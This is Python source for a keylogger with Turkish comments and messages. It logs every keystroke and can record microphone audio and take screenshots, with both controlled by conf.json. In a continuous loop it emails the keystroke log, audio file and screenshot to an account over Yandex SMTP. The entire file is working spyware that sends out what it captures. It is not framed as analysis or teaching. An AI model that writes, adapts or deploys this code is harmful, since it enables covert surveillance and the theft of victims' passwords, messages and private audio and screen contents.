import os
import smtplib
import wave
import pyscreenshot
import sounddevice as sd
from pynput import keyboard
from pynput.keyboard import Listener
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from scipy.io.wavfile import write
from email.mime.audio import MIMEAudio
import threading
from time import sleep
import json



keys = []

class KeyLogger:
    def __init__(self, data):
        self.data = data
        
    def save_data(self, key):
        global keys 
        keys.append(key)


    def write_file(self):
        global keys
        try:
            os.remove("log.txt")
        except:
            print("dosya silinemedi")
        with open("log.txt" , "a+" , encoding="utf-8") as file:

            for key in keys:

                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    file.write("\n")
                elif k.find("Key") == -1:
                     print(k)
                     file.write(k)
        keys=[]
        

    def send_mail(self, message):
        try:
            server = smtplib.SMTP_SSL('smtp.yandex.com.tr',465)
            server.ehlo()
            #server.starttls()
            server.login(self.data['email'], self.data['password'])
          
            server.sendmail(self.data['email'],self.data['email'], message.as_string())
            print("mail gönderiliyor")
            server.quit()
        except: 
            print("mesaj gönderilirken hat oluştu tekrar deneyeceğiz")



    def report(self):
        self.write_file()
        message = MIMEMultipart()
        message['From'] = self.data['email']
        message['To'] = self.data['email']
        try:
            message['Subject'] = "keylog"
            if(self.data['mic']=='True'):
                with open("output.wav", 'rb') as fp:
                    voice = MIMEAudio(fp.read(), _subtype="mp3")
                    message.attach(voice)
            if(self.data['screen']=='True'):
                with open("foto.png", 'rb') as fp:
                    image = MIMEImage(fp.read())
                    message.attach(image)
            with open("log.txt" , "r" , encoding="utf-8") as file:    
                attachment = MIMEText(file.read()) 
                message.attach(attachment)
            self.send_mail(message=message)
        except:
            message['Subject'] = "kayıtlar yok veya başka bir hata oldu"
            self.send_mail(message=message)

        


    def microphone(self):#mikrofon kaydı her tamamladığında mail gönderir
        while(True):
            if(self.data['mic']=='True'):
                fs = 5100
                seconds = int(self.data['time'])
                obj = wave.open('output.wav', 'w')
                obj.setnchannels(1)  # mono
                obj.setsampwidth(2)
                obj.setframerate(fs)
                myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
                obj.writeframesraw(myrecording)
                sd.wait()
                write("output.wav",fs,myrecording)
            if(self.data['screen']=='True'):
                self.screenshot()
            self.report()
    
        

    def screenshot(self):
        img = pyscreenshot.grab()
        img.save(fp="foto.png",format="png")        


    def run(self):
        
        keyboard_listener = keyboard.Listener(on_press=self.save_data)
        tMic = threading.Thread(name="İkinci servis", target=self.microphone)
        tMic.start()

        with keyboard_listener:
            keyboard_listener.join()
       
        
        

f = open('conf.json',) 
data = json.load(f) 
print(data)
keylogger = KeyLogger(data)
keylogger.run()
